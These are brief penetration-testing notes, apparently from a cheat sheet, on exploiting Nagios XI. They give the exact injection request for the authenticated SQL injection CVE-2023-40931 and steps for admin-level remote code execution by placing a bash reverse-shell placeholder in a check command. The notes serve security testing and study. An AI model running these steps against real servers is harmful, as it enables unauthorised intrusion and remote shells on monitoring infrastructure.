# Introduction
Nagios XI vs Nagios Core
They are part of the same suite but 2 Different things:
**/nagiosxi/xxxx = URL for NagiosXI**
**/nagios/= URL for NagiosCore**


# CVE
CVE-2023-40931
This exploit can lead to a SQLi via Authenticated session and you can perform it on:

1. NagiosXI 5.11 to 5.11.1
2. Having a valid set of creds
3. Get the PHPSESSID cookie from previous guide
4. Send a post request like following the ID is not filtered and will lead to SQLi:

```
POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1
 action=acknowledge banner message&id=3
```



# RCE in Nagios XI
You need to have a authenticated session into NagiosXI as Administrator or part of that group.
1. Configure --> Core Conf Manager --> Add new commands
2. Type you revshell like: `bash -c "REVSHELL HERE"`
3. Save and activate the commands
4. Monitoring --> choose you host --> Host Management --> Common Settings Tab
5. Choose the command to run under "Check Command" 
6. Profit
